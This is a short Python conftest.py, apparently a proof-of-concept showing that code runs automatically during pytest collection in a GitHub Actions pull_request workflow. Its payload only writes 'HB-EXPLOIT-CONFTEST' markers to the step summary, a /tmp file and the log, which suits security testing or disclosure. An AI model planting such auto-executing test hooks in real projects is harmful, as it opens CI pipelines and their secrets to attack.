"""Malicious conftest - auto-executes during pytest collection"""
import os

# Write marker to GITHUB_STEP_SUMMARY for visible evidence
step_summary = os.environ.get('GITHUB_STEP_SUMMARY')
if step_summary:
    with open(step_summary, 'a') as f:
        f.write('## 🚨 HB-EXPLOIT-CONFTEST: Pytest conftest.py code execution successful\n\n')
        f.write('This proves arbitrary code execution via pytest conftest.py in pull_request workflow.\n\n')

# Also write to a marker file for artifact-based verification
with open('/tmp/hb-exploit-marker.txt', 'w') as f:
    f.write('HB-EXPLOIT-CONFTEST\n')

# Signal via log output
print("::warning ::HB-EXPLOIT-CONFTEST: pytest conftest.py code execution achieved")
